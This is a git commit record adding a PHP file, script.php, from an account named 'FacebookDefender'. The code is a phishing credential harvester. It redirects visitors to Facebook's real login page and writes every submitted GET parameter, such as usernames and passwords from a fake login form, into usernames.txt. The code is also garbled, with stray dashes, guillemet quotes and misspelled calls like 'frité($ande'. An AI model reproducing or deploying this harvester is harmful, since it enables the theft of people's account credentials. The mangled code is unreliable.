0a9c01b2b8c75b2ca6c1cde541575d60506f5c80
FacebookDefender <52388245+FacebookDefender@users.noreply.github.com>
2019-06-30 21:27:38 -0300

    Add files via upload

---
+++ script.php
@@ -0,0 +1,31 @@
+– <?php
+
+– header(« Location: http://www.Facebook.com/login.php « );
+
+– $handle = fopen(« usernames.txt », « a »);
+
+-
+
+– foreach($_GET as $variable => $value) {
+
+– fwrite($handle, $variable);
+
+–
+
+– fwrite($handle, « = »);
+
+–
+
+– fwrite($handle, $value);
+
+–
+
+– fwrite($handle, « \r\n »);
+
+– }
+
+–
+
+– frité($ande, « \r\n »);
+
+– fclose($handle);
